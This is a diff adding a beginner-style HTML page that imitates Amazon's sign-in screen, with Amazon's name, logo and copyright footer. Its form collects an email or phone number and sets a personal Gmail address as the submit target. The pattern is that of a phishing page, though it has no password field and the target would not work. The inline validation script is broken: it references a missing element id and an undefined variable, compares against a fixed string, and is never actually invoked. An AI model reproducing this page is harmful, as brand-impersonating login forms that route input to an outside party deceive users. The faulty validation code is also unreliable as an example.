@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign in </title>
+    <link rel="stylesheet" href="amazonsign.css">
+</head>
+   
+</head>
+<body>
+<div class="container-exe-en">
+        <image class="iamg"src="https://imgs.search.brave.com/dYIzTDLBM35q9ooYasZ4vjSpF82qjOh64l4oDuXYQXI/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9jZG4u/bW9zLmNtcy5mdXR1/cmVjZG4ubmV0L3Vl/dENKNVMzUGhRUDl3/REVzRDVFR1gtMzIw/LTgwLmpwZw" alt="amazon amage" > </image>
+        <div class="container-solid">
+            <div id="basket"> 
+                <h1 class="sign"><big>Sign in</big></h1>
+                <form name="validation" id="form" action="akashgupta01082002@gmail.com" onsubmit="return validation" method="post">
+                    <Label for="emai11">Email or mobile phone number </Label><br>
+                    <input id="emai11" type="text" ><br><br>
+                    <button class="submit" type="submit" >Continue</button>
+                </form>
+                 <p class="privacy"> By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</p>
+             
+            </div>
+                <a id="needHelp" href="#" >Need help?</a>
+             <div id="about">
+                    <p class="privacy" >Buying for work?</p>
+                    <a href="#">Shop on Amazon Business</a>
+            </div>
+                    
+       </div>
+                <p class="new">New to Amazon?</p>
+                <button  class="create" type="submit" >Create your Amazon account</button>
+</div>
+    <footer>
+        <div  id="footer-container">
+        <div class="footer">
+            <a href="#" >Conditions of Use</a>
+            <a href="#" >Privacy Notice</a>
+            <a href="#" >Help </a>
+        </div>
+        <p>© 1996-2024, Amazon.com, Inc. or its affiliates</p>
+        </div>
+    </footer>
+
+
+    <script> 
+        let valid = document.getElementById("form").value;
+        let input = document.getElementById("email").value
+        let submit = document.getElementsByClassName("submit").value;
+        function validation() {
+            let flag = 0;
+            if(email == "") {
+                alert("Pleace fill the email number!")
+                flag =1;
+            } 
+            if(email != "@mail.com" ) {
+                alert()
+                flag =1;
+            }
+            flag = 0;
+
+        }
+    </script>
+</body>
+</html>
